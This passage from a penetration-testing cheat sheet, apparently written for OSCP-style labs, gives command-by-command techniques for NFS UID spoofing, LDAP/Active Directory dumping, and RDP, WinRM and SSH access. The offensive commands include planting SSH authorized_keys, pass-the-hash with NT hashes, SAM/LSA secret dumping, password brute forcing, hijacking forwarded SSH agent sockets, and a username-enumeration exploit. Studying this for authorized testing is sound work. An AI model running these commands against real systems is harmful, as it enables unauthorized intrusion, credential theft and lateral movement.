NFSv3 trusts the UID/GID the *client* advertises in its RPC calls rather than verifying it server-side. Creating a local attacker-box user whose UID numerically matches the target account (found via a leaked `/etc/passwd`, prior foothold, or `ls -la` ownership on the mount) lets you write/read files as that user even when `root_squash` is enforced and you are not root on the export.

**16. Beyond no_root_squash — SSH authorized_keys planting**
```
ssh-keygen -f /tmp/nfskey
mkdir -p /mnt/nfs-share/home/<target-user>/.ssh
cat /tmp/nfskey.pub >> /mnt/nfs-share/home/<target-user>/.ssh/authorized_keys
chown <matching-uid>:<matching-gid> /mnt/nfs-share/home/<target-user>/.ssh/authorized_keys
ssh -i /tmp/nfskey <target-user>@<target-ip>
```
Once you can write into the target user's home directory (via `no_root_squash` as root, or via the UID-matching trick above as that user's spoofed UID), dropping your own public key into `authorized_keys` gets you an interactive SSH session as that user without ever needing their password — often more useful than a one-shot SUID shell.

**17. Unmount cleanly**
```
umount /mnt/nfs-share
```
Standard cleanup step; leaving stale NFS mounts on the attack box can hang subsequent `showmount`/`mount` attempts against other hosts.

**17b. Nmap NFS NSE sweep (companion/alternative to showmount)**
```
nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target-ip>
```
`nfs-showmount` mirrors `showmount -e` (export list), `nfs-ls` recursively lists file contents of each export without mounting, and `nfs-statfs` reports filesystem usage/free space — all unauthenticated and useful when a mount isn't immediately available or you just need a fast read-only inventory.

---

### LDAP Enumeration

**18. Confirm anonymous bind and discover the base DN (Root DSE)**
```
ldapsearch -x -H ldap://<target-ip> -s base namingcontexts
```
`-x` forces simple (non-SASL) auth for an unauthenticated bind, `-s base` restricts the search scope to the Root DSE itself (no credentials needed even against AD, which normally blocks anonymous binds everywhere *except* the Root DSE), and requesting the `namingcontexts` attribute returns the domain's base DN (e.g. `DC=corp,DC=local`) needed for every subsequent query.

**19. Full anonymous dump of the directory tree**
```
ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" > ldap_full_dump.txt
```
With no filter supplied, this pulls every readable object under the base DN in one shot — the fastest way to see whether anonymous bind is fully open (common on standalone OpenLDAP boxes in labs) versus AD's typical Root-DSE-only exposure. Pipe to a file since output can be very large.

**Faster (nxc):** findings 20-27 below (users, groups, computers, password policy, Domain Admins/privileged users, delegation) can each be replaced with a single netexec flag once you have (or are testing) a credential:
```
nxc ldap <dc-ip> -u <user> -p <pass> --users
nxc ldap <dc-ip> -u <user> -p <pass> --groups
nxc ldap <dc-ip> -u <user> -p <pass> --admin-count
nxc ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation
nxc ldap <dc-ip> -u <user> -p <pass> --asreproast asrep_hashes.txt
nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting kerb_hashes.txt
```
Keep the manual `ldapsearch`/`windapsearch`/`ldapdomaindump` workflow below for when nxc isn't installed or you need a raw/custom filter.

**20. Enumerate all user objects**
```
ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
```
`(objectClass=user)` matches AD user (and computer, since computers inherit from user — filter further with `(&(objectClass=user)(objectCategory=person))` to exclude computer accounts) objects; requesting `sAMAccountName` and `description` keeps output to a scannable username list plus any notes admins left in the description field (a frequent password-hint leak).

**21. Enumerate group objects**
```
ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=group)" cn member
```
Returns every group's CN and its `member` DNs, letting you manually reconstruct membership of interesting groups (Domain Admins, Enterprise Admins) even before running BloodHound.

**22. Enumerate computer objects**
```
ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=computer)" cn dNSHostName operatingSystem
```
Lists every domain-joined machine with its DNS hostname and OS version/build — useful for building a target list and spotting unpatched or EOL operating systems (e.g. Server 2008/2012) worth prioritizing.

**23. Pull the domain password policy**
```
ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=domain)" minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration maxPwdAge minPwdAge pwdProperties
```
Queries the domain-root object itself, whose `objectClass` is `domainDNS`/`domain`; the returned attributes give minimum password length, history depth, lockout threshold/duration, and max/min password age (stored as negative 100-nanosecond intervals — convert to days before relying on it) — essential for safely sizing a password-spray without locking accounts out.

**24. Anonymous enumeration with windapsearch (unauthenticated attempt)**
```
python3 windapsearch.py -d corp.local --dc-ip <target-ip>
```
Omitting `-u`/`-p` makes windapsearch attempt an anonymous bind before falling back to prompting; against a hardened AD DC this usually only returns Root-DSE-level metadata (same limitation as raw `ldapsearch`), but it's a fast way to confirm bind status and enumerate domain functional level before you have creds.

**25. windapsearch full user/group/computer enumeration (credentialed)**
```
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> -U
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> -G
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> -C -r
```
`-U` lists all user objects, `-G` all groups, `-C` all computers with `-r` additionally resolving each computer's hostname to an IPv4 address via DNS — turning raw LDAP into an immediately actionable target/user list once even a single low-privilege credential is obtained (e.g. via ASREPRoast, a default cred, or a previous foothold).

**26. windapsearch privilege-focused modules**
```
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> --da
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> -PU
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> --unconstrained-computers
```
`--da` recursively lists effective Domain Admins members (following nested groups); `-PU`/`--privileged-users` recursively enumerates all users in any group with adminCount=1-style admin ACLs; `--unconstrained-computers` flags computer accounts trusted for unconstrained delegation — a direct pointer toward printer-bug/coercion-to-DA attack paths.

**27. windapsearch custom LDAP filter mode**
```
python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> --custom "(&(objectCategory=user)(adminCount=1))"
```
Passes any raw LDAP filter through, giving the full expressiveness of `ldapsearch` filters (e.g. `adminCount=1` to find protected/admin accounts) with windapsearch's cleaner formatted output.

**28. ldapdomaindump — anonymous attempt**
```
ldapdomaindump -u '' <target-ip>
```
Passing an empty username has ldapdomaindump attempt an unauthenticated bind; against most production AD DCs this fails (AD blocks anonymous simple binds beyond Root DSE by default) but is worth trying first and reliably works on misconfigured DCs and many standalone OpenLDAP lab targets.

**29. ldapdomaindump — credentialed full domain dump**
```
ldapdomaindump -u 'CORP\lowpriv' -p 'Password123' -o /tmp/ldapdump <target-ip>
```
With any valid domain credential, this produces a full set of human-readable HTML pages (users, groups, computers, policy, trusts) plus JSON and greppable output in `/tmp/ldapdump` — the standard "first thing to run after getting one working credential" step before moving to BloodHound, since it needs no collector agent and works purely over LDAP.

**30. ldapdomaindump — NTLM hash (pass-the-hash) auth and minimal/no-JSON output**
```
ldapdomaindump -u 'CORP\lowpriv' -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -o /tmp/ldapdump -r -n <dns-server-ip> <target-ip>
```
`-p LM:NTLM` authenticates with a cracked/dumped NTLM hash instead of a cleartext password (no crack needed, `-at NTLM` is default); `-r` resolves computer hostnames via `-n <dns-server-ip>`, filling in IP addresses in the HTML computers report so it's immediately targetable.

**31. LDAPS (LDAP over SSL, port 636) — encrypted anonymous bind**
```
ldapsearch -x -H ldaps://<target-ip> -s base namingcontexts
```
Same Root-DSE query as finding 18 but over TLS on 636 — test this whenever plaintext 389 is filtered/blocked but 636 is open (common on hardened DCs), or when the target enforces LDAP signing/channel binding and rejects unsigned plaintext queries.

**32. Global Catalog query (port 3268 / 3269 GC-over-SSL)**
```
ldapsearch -x -H ldap://<target-ip>:3268 -b "DC=corp,DC=local" "(sAMAccountName=*)" sAMAccountName
ldapsearch -x -H ldaps://<target-ip>:3269 -b "DC=corp,DC=local" "(sAMAccountName=*)" sAMAccountName
```
The Global Catalog (3268 plaintext, 3269 over SSL) exposes a forest-wide partial attribute set across *all* domains in a forest from a single query — useful in multi-domain environments where the base-DN queries above (finding 19-22) only see the local domain.

---

## Tools Table

| Tool | Purpose | Auth Required | Typical First Command | Source |
|---|---|---|---|---|
| `rpcinfo` | Enumerate registered RPC services on a portmapper (NFS, mountd, NIS, lock manager) | None | `rpcinfo -p <ip>` | [rpcinfo man — Linux Command Library](https://linuxcommandlibrary.com/man/rpcinfo) |
| `rpcclient` | Null-session MSRPC/SMB enumeration of users, groups, domain info, password policy, shares | None (null session) | `rpcclient -U "" -N <ip>` | [rpcclient Enumeration — 0xma](https://0xma.github.io/hacking/rpcclient_enumeration.html) |
| `showmount` | List NFS exports and connected clients | None | `showmount -e <ip>` | [2049 - Pentesting NFS Service — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) |
| `mount` (NFS client) | Mount a discovered NFS export locally for file access | Depends on export ACL, not credentials | `mount -t nfs -o vers=3 <ip>:/export /mnt/nfs-share` | [Linux Privilege Escalation using Misconfigured NFS — Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/) |
| `ldapsearch` | Raw LDAP queries — base DN discovery, user/group/computer/policy dumps | None for anonymous/Root DSE bind; simple bind for full dumps | `ldapsearch -x -H ldap://<ip> -s base namingcontexts` | [LDAP Anonymous Bind — Medium/Vinay A S](https://medium.com/@vinayas23913/ldap-anonymous-bind-9c023c6f9b04) |
| `windapsearch` | Python wrapper for structured AD LDAP enumeration (users/groups/computers/DA/delegation) | Anonymous attempt supported; effective results usually need creds | `python3 windapsearch.py -d <domain> --dc-ip <ip>` | [windapsearch — ropnop, GitHub](https://github.com/ropnop/windapsearch) |
| `ldapdomaindump` | LDAP-based AD domain dumper producing HTML/JSON/greppable reports | Anonymous attempt supported (`-u ''`); reliable results need creds/hash | `ldapdomaindump -u 'DOMAIN\\user' -p 'pass' -o outdir <ip>` | [ldapdomaindump — dirkjanm, GitHub](https://github.com/dirkjanm/ldapdomaindump) |

---

## RDP, WinRM, SSH — Manual Enumeration & Interaction

## Overview
- **RDP**: `xfreerdp` (FreeRDP 3.x, the current Kali default; `rdesktop` is legacy/fallback) is used both to open full graphical sessions and to validate credentials headlessly (`+auth-only`). NLA/CredSSP is the default negotiated security layer on modern Windows and must be handled explicitly (accepted, downgraded, or used for pass-the-hash via Restricted Admin mode).
- **WinRM**: `evil-winrm` is the de facto interactive shell for WinRM (HTTP 5985 / HTTPS 5986) once local admin or WinRM-group credentials are known; `netexec` (nxc) is used first for fast credential validation, spraying, and one-liner command execution across hosts before dropping into evil-winrm for an interactive session.
- **SSH**: Enumeration is mostly banner/algorithm grabbing (`nc`, `nmap` NSE scripts) to fingerprint OS/version, followed by credential or key-based access attempts. A recurring OSCP/CTF pattern is reusing a private key found on one host (or in a backup/git repo) against other hosts' `authorized_keys`, and deriving the matching public key from a found private key with `ssh-keygen -y`.

---

### RDP

**1. Basic xfreerdp connection**
```
xfreerdp /u:<username> /p:'<password>' /d:<domain> /v:<target-ip> /cert:ignore
```
Core auth flags: `/u:` username, `/p:` password, `/d:` domain, `/v:` target host/IP (optionally `host:port`). `/cert:ignore` skips the self-signed certificate prompt, which is the default on nearly all lab/OSCP targets.

**2. Full interactive session with quality-of-life flags**
```
xfreerdp /u:<user> /p:'<pass>' /d:<domain> /v:<ip> /dynamic-resolution /cert:ignore \
  +clipboard +window-drag /compression /auto-reconnect /drive:mount,/home/kali/loot
```
`/drive:share_name,/local/path` maps a local directory into the session for tool upload/exfil; `+clipboard` enables clipboard redirection; `/dynamic-resolution` resizes on window resize.

**3. Credential validation only (no GUI session)**
```
xfreerdp /v:<ip> /u:<user> /p:'<pass>' +auth-only /cert:ignore
```
Authenticates and exits (status 0 on success, "Authentication failure" on bad creds) without needing an X display — useful for quickly confirming discovered creds are valid for RDP, akin to what nxc does but via the real RDP auth path (catches permission issues nxc's SMB-based check would miss).

**4. Console/admin session**
```
xfreerdp /u:<user> /p:'<pass>' /v:<ip> /admin /cert:ignore
```
`/admin` (or `+admin`) requests the console/admin session — relevant for older single-session admin scenarios and matching an already-logged-in admin's session.

**5. Pass-the-hash via Restricted Admin mode**
```
xfreerdp /v:<ip> /u:Administrator /d:<domain> /pth:<NTHASH> /cert:ignore +clipboard /dynamic-resolution
```
`/pth:` takes the NT hash (32 hex chars) directly, bypassing the cleartext password — this is CredSSP-level pass-the-hash and only works if the target allows Restricted Admin mode (`HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` = 0). Restricted Admin was introduced in RDP 8.1 specifically as a "no cleartext password over the wire" feature and initially shipped on by default, inadvertently enabling PtH — but Microsoft's July 8, 2014 security advisory (2973351/2975625) turned it **off** by default on Windows 8.1/Server 2012 R2 going forward (key typically absent, which means disabled). Don't assume PtH via RDP will "just work" against an unmodified 2012R2/8.1 box — it requires the DWORD to have been explicitly (mis)configured to 0 by an admin, or discovered already enabled via prior recon/foothold.

**6. Explicit "Restricted Admin" login (no hash needed, if already privileged)**
```
xfreerdp /restricted-admin /u:'<DOMAIN>\<user>' /p:'<pass>' /v:<ip>
```
Forces restricted admin mode explicitly (server must support/allow it).

**7. Legacy client: rdesktop**
```
rdesktop -u <user> -p '<pass>' -d <domain> -g 1600x800 -r disk:share=/root/loot <ip>
```
`-g` sets geometry (e.g. `85%` or `WxH`), `-r disk:sharename=/local/path` redirects a drive. Kept in the OSCP toolkit as a fallback when xfreerdp fails to negotiate against very old/broken RDP stacks.

**8. NLA / CredSSP considerations**
NLA (Network Level Authentication) forces authentication (NTLM or Kerberos, wrapped in CredSSP) to occur *before* a full RDP session/desktop is rendered, unlike classic RDP security which authenticates after the graphical handshake. This matters operationally: (a) NLA-protected hosts require valid creds up front, so unauthenticated screenshot/banner grabs won't get a login screen; (b) some legacy exploits (e.g. BlueKeep, `cve_2019_0708_bluekeep_rce`) fail outright against NLA-enabled targets since NLA blocks the pre-auth code path they rely on; (c) xfreerdp's `/sec:nla` forces NLA (default behavior against modern Windows), while `/sec:rdp` forces the older RDP security layer for hosts/tools that mishandle NLA negotiation.

**9. Unauthenticated NLA/OS fingerprinting via nmap**
```
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020 -T4 <ip>
```
`rdp-ntlm-info` sends an incomplete CredSSP/NTLM negotiation with null credentials; the server responds with an NTLMSSP message leaking NetBIOS name, DNS domain/hostname, and OS build — all without valid creds, and works precisely because CredSSP's initial handshake echoes this info before rejecting the empty auth.

**10. netexec RDP checks (fast triage before touching xfreerdp)**
```
nxc rdp <ip> -u <user> -p '<pass>'
nxc rdp <ip> -u <user> -H '<NTHASH>'
nxc rdp <ip> -u <user> -p '<pass>' --local-auth
nxc rdp <ip> -u <user> -p '<pass>' --screenshot --screentime 10
```
`nxc rdp` alone (no creds) reports whether NLA is enabled/required against the target; `--screenshot` captures the login screen (works pre-auth when NLA is *disabled*).

---

### WinRM

**11. netexec WinRM credential check / spray (do this before evil-winrm)**
```
nxc winrm <ip> -u <user> -p '<pass>'
nxc winrm <ip> -u <user> -H '<NTHASH>'
nxc winrm <ip> -u users.txt -p passwords.txt --local-auth
nxc winrm <ip> -u <user> -p '<pass>' -d <domain>
```
`--local-auth` targets a local (non-domain) account; `Pwn3d!` in the output indicates the account has admin-level WinRM access (able to execute code), not just an authenticated session.

**12. netexec WinRM one-liner command execution**
```
nxc winrm <ip> -u <user> -p '<pass>' -x "whoami /all"
nxc winrm <ip> -u <user> -p '<pass>' -X '$PSVersionTable'
```
`-x` runs a cmd.exe command; `-X` runs a raw PowerShell command/expression — useful for quick verification before committing to a full evil-winrm session.

**13. Basic evil-winrm session**
```
evil-winrm -i <ip> -u <user> -p '<password>'
```
`-i/--ip` (required), `-u/--user`, `-p/--password` (prompts if omitted). Default port 5985.

**14. evil-winrm with local script/executable loading**
```
evil-winrm -i <ip> -u <user> -p '<pass>' -s /home/kali/scripts/ -e /home/kali/exes/
```
`-s/--scripts` points to a directory of `.ps1` files that become auto-tab-completable/loadable inside the shell (e.g. `PowerView.ps1`); `-e/--executables` similarly stages local `.exe`/binaries for the `menu`/upload workflow. Once connected, `menu` lists loaded functions (e.g. `Bypass-4MSI`, `Dll-Loader`, `Donut-Loader`).

**15. evil-winrm pass-the-hash**
```
evil-winrm -i <ip> -u <user> -H '<NTHASH>'
```
`-H/--hash` authenticates with the NT hash instead of a password (works when WDigest/NTLM is permitted, no need to crack).

**16. evil-winrm over SSL / custom port**
```
evil-winrm -i <ip> -u <user> -p '<pass>' -S -P 5986 -c cert.pem -k key.pem
```
`-S/--ssl` forces HTTPS; `-P/--port` overrides the default 5985; `-c/--pub-key` and `-k/--priv-key` supply a client certificate pair when the WinRM listener requires cert auth.

**17. evil-winrm Kerberos auth**
```
evil-winrm -i <hostname> -r <DOMAIN.COM> -K /path/ticket.ccache --spn HTTP
```
`-r/--realm` sets the Kerberos realm (needs `/etc/krb5.conf` configured / `KRB5CCNAME` set appropriately); `-K/--ccache` loads a ccache/kirbi ticket obtained via Rubeus/impacket for pass-the-ticket into WinRM.

**18. In-session file transfer (built-in evil-winrm commands)**
```
upload /home/kali/tools/winPEAS.exe C:\Windows\Temp\winpeas.exe
download C:\Users\victim\Desktop\flag.txt /home/kali/loot/flag.txt
```
Both commands operate over the existing WinRM channel (PSRP-encoded base64 chunks) — no SMB/HTTP server needed.

**19. In-session logging and quiet-of-life flags**
```
evil-winrm -i <ip> -u <user> -p '<pass>' -l -n
```
`-l/--log` writes the full session transcript to `$HOME` (important for OSCP proof-of-access documentation); `-n/--no-colors` for clean log output/piping.

**20. netexec extra WinRM/SMB post-auth modules (used from the same nxc session)**
```
nxc winrm <ip> -u <user> -p '<pass>' --sam
nxc winrm <ip> -u <user> -p '<pass>' --lsa
nxc smb <ip> -u <user> -p '<pass>' --local-auth --rid-brute
```
`--sam`/`--lsa` dump local SAM/LSA secrets over the WinRM/WMI-backed exec chain when admin; `--rid-brute` enumerates local users via anonymous/low-priv RID cycling (SMB protocol, but standard pre-WinRM enumeration step for the same host).

---

### SSH

**21. Manual banner grab**
```
nc -nv <ip> 22
# or
echo | timeout 2 nc -nv <ip> 22
```
Immediately returns the SSH identification string (e.g. `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`), which fingerprints OS distro/patch level for CVE lookup — no auth required, protocol sends the banner first.

**22. nmap full SSH enumeration sweep**
```
nmap -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN ssh_22.txt <ip>
```
- `banner` — grabs the raw version string.
- `ssh2-enum-algos` — lists every kex/cipher/MAC/compression algorithm offered (useful for spotting legacy/weak algo support indicating an old build).
- `ssh-hostkey` — dumps host public key(s) + fingerprints (compare against known-weak-key databases, see #26).
- `ssh-auth-methods` — enumerates which auth methods the server accepts (`publickey`, `password`, `keyboard-interactive`) for a given username, revealing whether password auth is even allowed.

**23. Individual nmap NSE script usage**
```
nmap --script ssh-hostkey -p 22 <ip>
nmap --script ssh-auth-methods --script-args="ssh.user=<username>" -p 22 <ip>
```
`ssh-auth-methods` needs a `ssh.user` script-arg to report per-user allowed methods (some servers vary by account, e.g. root disallowed for password).

**24. Verbose interactive connection (algorithm/negotiation debugging)**
```
ssh -vvv <user>@<ip>
```
Triple-verbose shows full kex negotiation, offered host key types, and auth method attempts — useful when a target's SSH refuses modern clients (forces `-oKexAlgorithms=+diffie-hellman-group1-sha1` or `-oHostKeyAlgorithms=+ssh-rsa` style downgrades to connect to old CTF-style boxes).

**25. Password brute force with Hydra**
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
hydra -L users.txt -P passwords.txt -t 4 ssh://<ip>
```
`-l/-L` single/list username, `-P` password wordlist, `-t` parallel connections (keep low against SSH — most daemons rate-limit/lock after failed attempts, `-t 4` is a safer OSCP default than the tool's default of 16).

**26. Weak/predictable key detection — Debian OpenSSL PRNG bug (CVE-2008-0166)**
```
git clone https://github.com/g0tmi1k/debian-ssh
# then, having a target's public host key or authorized_keys entry:
grep -r "<fingerprint-or-modulus>" debian-ssh/
```
Debian/Ubuntu OpenSSL packages (Sept 2006–May 2008) had only ~32,767 possible seeds for key generation, making all RSA/DSA keys from that window enumerable. If a target's SSH host key or a user's key matches this known-weak-key set, the corresponding private key can be pulled straight from the pre-generated database — usable both to log in as a user whose `authorized_keys` uses a weak key, or to MITM/decrypt traffic to a host with a weak host key.

**27. Deriving a public key from a found private key**
```
chmod 600 id_rsa
ssh-keygen -y -f id_rsa > id_rsa.pub
ssh-keygen -lf id_rsa      # print fingerprint for quick comparison
```
When a private key is found (backup, git history, home directory, config file) but you need to confirm which account/host it unlocks, regenerate the public key and diff its fingerprint against entries in candidate `~/.ssh/authorized_keys` files or `ssh-keyscan` output.

**28. Key reuse across hosts (lateral movement)**
```
ssh -i id_rsa <user>@<other-host>
# enumerate candidate hosts from a compromised box's known_hosts:
cat ~/.ssh/known_hosts | cut -d' ' -f1 | tr ',' '\n'
```
A private key recovered on one host is routinely tried against every other host listed in that user's `~/.ssh/known_hosts` (and against common usernames on sibling boxes in the same subnet) since key reuse across a fleet is common in exam/lab environments.

**29. Fleet-wide host key fingerprinting with ssh-keyscan**
```
ssh-keyscan -t rsa,ed25519 <ip1> <ip2> <ip3> > hostkeys.txt
ssh-keyscan -t rsa <ip> | ssh-keygen -lf -
```
`ssh-keyscan` grabs a host's public key(s) without authenticating; piping into `ssh-keygen -lf -` gets the fingerprint for comparing whether two "different" hosts actually share the same underlying SSH host key (common on cloned VM templates — a strong signal the whole fleet shares one image, and possibly one set of credentials/keys).

**29b. Edge case — SSH agent forwarding abuse**
```
# on a box where you land with agent forwarding already enabled (check first):
echo $SSH_AUTH_SOCK
ssh-add -l

# if a socket exists and lists identities, you can piggyback on someone else's forwarded agent
# to authenticate onward to hosts *without* ever seeing the private key material:
ssh -o StrictHostKeyChecking=no <other-user>@<other-host>   # uses the forwarded agent transparently

# hunting for other users' forwarded-agent sockets you have read/connect access to:
find /tmp -type s -name 'agent.*' 2>/dev/null
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXXX/agent.1234 ssh-add -l
```
If `ForwardAgent yes` is set (globally in `/etc/ssh/ssh_config` or per-host) and a legitimate user SSHes into the box you've compromised while their agent is forwarded, their agent socket is briefly usable by anyone who can access it during that session (typically requires matching the connecting user's UID, but root or a misconfigured socket permission can expose it) — letting you authenticate to every host their key is trusted on without ever exfiltrating the private key itself. Always check `$SSH_AUTH_SOCK`/`ssh-add -l` immediately after landing a shell.

**29c. Pre-auth username enumeration — CVE-2018-15473 (OpenSSH < 7.7)**
```
git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit
python3 sshUsernameEnumExploit.py --userList users.txt <ip> [--port 22]
```
Sends a malformed `SSH2_MSG_USERAUTH_REQUEST` (authenticating via a crafted public-key packet) and times the server's response: a valid username causes OpenSSH to check the key against `authorized_keys` before rejecting (slower), an invalid one is rejected immediately (faster) — a pre-auth timing oracle for username discovery against builds before the 7.7 fix. Affects OpenSSH 2.3–7.7 inclusive. nxc's `ssh` module has no built-in equivalent (its flags are limited to `--key-file`/`--sudo-check`/`-x`), so this is a standalone technique.

**30. netexec SSH module (credential/key spraying)**
```
nxc ssh <ip> -u root -p '<pass>'
nxc ssh <ip> -u root --key-file id_rsa
nxc ssh <ip> -u users.txt -p passwords.txt
nxc ssh <ip> -u <user> -p '<pass>' -x "cat /etc/passwd"
nxc ssh <ip> -u <user> -p '<pass>' --sudo-check
```
`--key-file` tests a recovered private key against a target/user; `-x` runs a one-off command post-auth; `--sudo-check` reports whether the account has any passwordless/sudo rights, a fast privesc triage step.

---

## Tools Table

| Tool | Protocol | Primary Use in OSCP Workflow | Key Flags Covered |
|---|---|---|---|
| `xfreerdp` (FreeRDP 3.x) | RDP (3389) | Full graphical session, credential validation, pass-the-hash | `/u /p /d /v`, `/cert:ignore`, `/drive:`, `+clipboard`, `/dynamic-resolution`, `+auth-only`, `/admin`, `/pth:`, `/restricted-admin`, `/sec:nla`\|`rdp` |
| `rdesktop` | RDP (3389) | Legacy fallback client | `-u -p -d -g -r disk:` |
| `nmap` (NSE) | RDP / SSH | Unauthenticated fingerprinting, host key/algo enumeration | `rdp-ntlm-info`, `rdp-enum-encryption`, `rdp-vuln-ms12-020`, `banner`, `ssh2-enum-algos`, `ssh-hostkey`, `ssh-auth-methods` |
| `evil-winrm` | WinRM (5985/5986) | Interactive PS shell, file transfer, in-memory exec | `-i -u -p -H -S -P -c -k -r -K --spn -s -e -l -n`; in-shell `upload/download/menu/services/Invoke-Binary/Bypass-4MSI` |
| `netexec` (nxc) | RDP / WinRM / SSH / SMB | Fast credential validation, spraying, one-liner exec, post-auth modules | `-u -p -H -d --local-auth --laps -x -X --port --screenshot --sam --lsa --rid-brute --key-file --sudo-check --put-file --get-file` |
| `nc` (netcat) | SSH / generic TCP | Manual banner grab | `-nv` |
| `ssh` (OpenSSH client) | SSH | Interactive/verbose connect, key auth, algorithm negotiation | `-i -v/-vvv -o` |
| `ssh-keygen` | SSH | Derive pubkey from private key, fingerprinting | `-y -f`, `-l -f` |
| `ssh-keyscan` | SSH | Passive host key harvesting at scale | `-t` |
| `hydra` | SSH (and RDP via module) | Credential brute forcing | `-l -L -p -P -t ssh://` |
| `debian-ssh` (g0tmi1k) | SSH | Weak Debian OpenSSL key (CVE-2008-0166) lookup/database | n/a (key database repo) |

---

**Note on scope**: All commands above are standard, publicly-documented pentesting techniques taught in OSCP/PWK-aligned material and vendor/tool documentation. Sources are cited inline per finding for verification.

**Sources (consolidated)**
- https://linux.die.net/man/1/xfreerdp
- https://commandmasters.com/commands/xfreerdp-linux/
- https://www.kali.org/tools/freerdp3/
- https://github.com/FreeRDP/FreeRDP/issues/2893
- http://opentechnotes.blogspot.com/2015/02/compile-headless-freerdp-credential-checking.html
- https://hexmos.com/freedevtools/man-pages/user-commands/file-management/xfreerdp3/
- https://unclesp1d3r.github.io/posts/2023-02-16-pth-rdp/
- https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/rdp
- https://www.kali.org/tools/rdesktop/
- https://github.com/xapax/oscp/blob/master/templates/windows-template.md
- https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/
- https://www.huntress.com/threat-library/vulnerabilities/cve-2019-0708
- https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html
- https://explainshell.com/explain?cmd=nmap+--script+%22rdp-enum-encryption+or+rdp-vuln-ms12-020+or+rdp-ntlm-info%22+-p+3389+-T4+10.10.10.27+-oX+nmap_RDP-enum
- https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
- https://www.netexec.wiki/rdp-protocol/screenshot-without-nla-not-connected
- https://github.com/Hackplayers/evil-winrm
- https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
- https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid
- https://en.wikipedia.org/wiki/Banner_grabbing
- https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html
- https://nmap.org/nsedoc/scripts/ssh-auth-methods.html
- https://github.com/oncybersec/oscp-enumeration-cheat-sheet
- https://jumpnowtek.com/security/Enumerating-SSH-algorithms.html
- https://brandonrussell.io/OSCP-Notes/My%20Hydra%20Cheatsheet.html
- https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh
- https://github.com/g0tmi1k/debian-ssh
- https://www.debian.org/security/2008/dsa-1571
- https://pentestmonkey.net/blog/metasploit-ssh-key-database
- https://x7331.gitbook.io/boxes/services/tcp/remote-access/22-ssh
- https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
- https://www.pentestpartners.com/security-blog/how-to-abuse-ssh-keys/
- https://github.com/kaio6fellipe/ssh-enum
---
## SMTP & SNMP Manual Enumeration

---

## 1. SMTP Enumeration

### Overview
SMTP (TCP/25, often also 465/587 for submission) frequently leaks valid mailbox/OS-account usernames through the `VRFY`, `EXPN`, and `RCPT TO` verbs, and may be misconfigured as an open relay. OSCP-style workflow: (1) grab the banner/service version, (2) enumerate supported commands, (3) attempt username enumeration via all three verbs (server support varies — Postfix/Exim usually disable VRFY by default, so RCPT TO during a `MAIL FROM`/`RCPT TO` transaction is often the only reliable channel), (4) test for open relay.

### Findings

**Banner grab / service identification**
```
nmap -sV -p25 -sC <target>
```
Grabs the SMTP banner and runs default NSE scripts (includes `smtp-commands`); banner often discloses the mail daemon and version (e.g. Postfix, Exim, hMailServer, Microsoft ESMTP).

**Manual banner grab with netcat**
```
nc -nv <target> 25
```
Opens a raw TCP connection; server responds with `220 <hostname> ESMTP ...` banner without needing to send anything.

**Manual banner grab with telnet**
```
telnet <target> 25
```
Same purpose as netcat; telnet is preferred by some because it echoes typed commands, easier for interactive sessions.

**List supported SMTP verbs (nmap)**
```
nmap -p25 --script smtp-commands <target>
```
Sends `EHLO` and reports the full command list the server advertises (VRFY, EXPN, STARTTLS, AUTH mechanisms, etc.), telling you which enumeration verbs are worth trying.

**Manual EHLO/HELO handshake (netcat/telnet)**
```
nc -nv <target> 25
HELO test
```
or `EHLO test` for extended SMTP; required as the first command by most servers before other verbs are accepted.

**Manual username enumeration with VRFY**
```
nc -nv <target> 25
VRFY root
VRFY nonexistentuser1234
```
`250` response = valid user (or ambiguous match), `550`/`551`/`553` = invalid; compare responses between a likely-valid and clearly-invalid username to fingerprint the difference. Many modern MTAs (Postfix default, Exim hardened configs) disable VRFY.

**Manual username enumeration with EXPN**
```
nc -nv <target> 25
EXPN root
EXPN admin
```
